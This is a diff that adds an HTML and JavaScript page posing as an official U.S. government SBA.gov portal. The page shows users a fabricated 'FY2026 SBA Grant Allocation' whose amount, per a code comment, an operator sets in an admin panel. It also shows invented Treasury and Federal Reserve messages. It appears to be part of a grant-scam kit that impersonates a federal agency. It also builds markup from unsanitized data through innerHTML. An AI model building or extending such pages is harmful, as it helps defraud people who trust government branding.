@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SBA Portal | Transaction Ledger</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .t-row { display: flex; justify-content: space-between; padding: 18px 0; border-bottom: 1px solid #f1f5f9; align-items: center; }
+        .t-row:last-child { border-bottom: none; }
+        .t-info { display: flex; flex-direction: column; gap: 4px; }
+        .t-name { font-weight: 700; font-size: 12px; color: #00274c; text-transform: uppercase; letter-spacing: 0.5px; }
+        .t-date { font-size: 10px; color: #94a3b8; font-family: 'Courier New', monospace; font-weight: bold; }
+        .t-amt { font-weight: 800; text-align: right; font-size: 15px; }
+        .plus { color: #10b981; }
+        .minus { color: #ef4444; }
+        .status-badge { font-size: 9px; padding: 3px 10px; border-radius: 4px; font-weight: 900; text-transform: uppercase; margin-top: 5px; display: inline-block; letter-spacing: 0.5px; }
+        .bg-pending { background: #fffbeb; color: #92400e; border: 1px solid #fef3c7; }
+        .bg-success { background: #ecfdf5; color: #065f46; border: 1px solid #d1fae5; }
+        .empty-state { text-align: center; padding: 40px 20px; color: #64748b; font-size: 12px; font-style: italic; }
+    </style>
+</head>
+<body style="background: #f1f5f9;">
+    <div class="gov-banner">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:16px; margin-right:8px;" alt="USA Flag">
+        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE 2026
+    </div>
+
+    <div class="nav" style="display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; background: #00274c;">
+        <h1 style="margin: 0; font-size: 16px; letter-spacing: 2px; color: white;">SBA.GOV</h1>
+        <button onclick="location.href='dashboard.html'" style="width: auto !important; padding: 6px 15px; background: rgba(255,255,255,0.15); border: 1px solid rgba(255,255,255,0.3); border-radius: 6px; color: white; font-size: 11px; font-weight: 700; cursor: pointer;">
+            BACK
+        </button>
+    </div>
+
+    <div class="container">
+        <div style="margin-bottom: 20px; margin-top: 10px;">
+            <h2 style="font-size: 20px; color: #00274c; margin-bottom: 5px;">Transaction Ledger</h2>
+            <p style="font-size: 11px; color: #64748b;">Reviewing all 2026 federal disbursements and allocation records.</p>
+        </div>
+
+        <div class="card" id="transactionList" style="padding: 20px; min-height: 250px; border-radius: 12px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.05);">
+            <div class="empty-state" id="loading">
+                <p>Establishing secure connection to Treasury servers...</p>
+            </div>
+        </div>
+
+        <div style="background: #ffffff; border: 1px solid #e2e8f0; padding: 18px; border-radius: 12px; margin-top: 20px;">
+            <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 8px;">
+                <span style="font-size: 14px;">⚖️</span>
+                <b style="font-size: 11px; color: #1e293b; text-transform: uppercase;">Audit Log Notice</b>
+            </div>
+            <p style="font-size: 10px; color: #64748b; margin: 0; line-height: 1.6;">
+                Records are synchronized with the Federal Reserve Bank. Discrepancies must be reported within 48 hours of posting.
+            </p>
+        </div>
+    </div>
+
+    <script type="module">
+        import { collection, query, where, onSnapshot, doc, getDoc, orderBy } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+
+        onAuthStateChanged(window.auth, async (user) => {
+            if (user) {
+                const list = document.getElementById('transactionList');
+                
+                // 1. Get initial User Data for the Master Grant Row
+                const userRef = doc(window.db, "users", user.uid);
+                
+                // We use onSnapshot here so the "Master Allocation" row updates if you change their balance in admin
+                onSnapshot(userRef, (userSnap) => {
+                    const userData = userSnap.data() || {};
+                    const userBalance = userData.balance || "0.00";
+
+                    // 2. Listen for activity in "requests" (Withdrawals, Transfers)
+                    const q = query(
+                        collection(window.db, "requests"), 
+                        where("userId", "==", user.uid)
+                    );
+                    
+                    onSnapshot(q, (snapshot) => {
+                        list.innerHTML = ""; // Clear loader
+
+                        // ALWAYS SHOW MASTER ALLOCATION FIRST
+                        list.innerHTML += `
+                            <div class="t-row">
+                                <div class="t-info">
+                                    <span class="t-name">FY2026 SBA GRANT ALLOCATION</span>
+                                    <span class="t-date">ID: FED-RES-2026-${user.uid.substring(0,6).toUpperCase()}</span>
+                                </div>
+                                <div class="t-amt">
+                                    <span class="plus">+$${userBalance}</span><br>
+                                    <span class="status-badge bg-success">ALLOCATED</span>
+                                </div>
+                            </div>`;
+
+                        // ADD ADDITIONAL TRANSACTIONS FROM REQUESTS
+                        if (!snapshot.empty) {
+                            snapshot.forEach((snap) => {
+                                const t = snap.data();
+                                const isWithdrawal = t.type === "WITHDRAWAL" || t.type === "TRANSFER";
+                                
+                                // Format Date
+                                let dateStr = "PROCESSING...";
+                                if (t.timestamp) {
+                                    const d = t.timestamp.toDate();
+                                    dateStr = d.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
+                                }
+
+                                list.innerHTML += `
+                                    <div class="t-row">
+                                        <div class="t-info">
+                                            <span class="t-name">${(t.type || 'FUNDS TRANSFER').replace(/_/g, ' ')}</span>
+                                            <span class="t-date">${dateStr}</span>
+                                        </div>
+                                        <div class="t-amt">
+                                            <span class="${isWithdrawal ? 'minus' : 'plus'}">
+                                                ${isWithdrawal ? '-' : '+'}$${parseFloat(t.amount || 0).toLocaleString('en-US', {minimumFractionDigits: 2})}
+                                            </span><br>
+                                            <span class="status-badge ${t.status === 'APPROVED' ? 'bg-success' : 'bg-pending'}">
+                                                ${t.status || 'PROCESSING'}
+                                            </span>
+                                        </div>
+                                    </div>`;
+                            });
+                        } else {
+                            list.innerHTML += `
+                                <div class="empty-state">
+                                    <p>Waiting for additional ledger activity...</p>
+                                </div>`;
+                        }
+                    });
+                });
+ 
+           } else {
+                window.location.href = 'index.html';
+            }
+        });
+    </script>
+</body>
+</html>
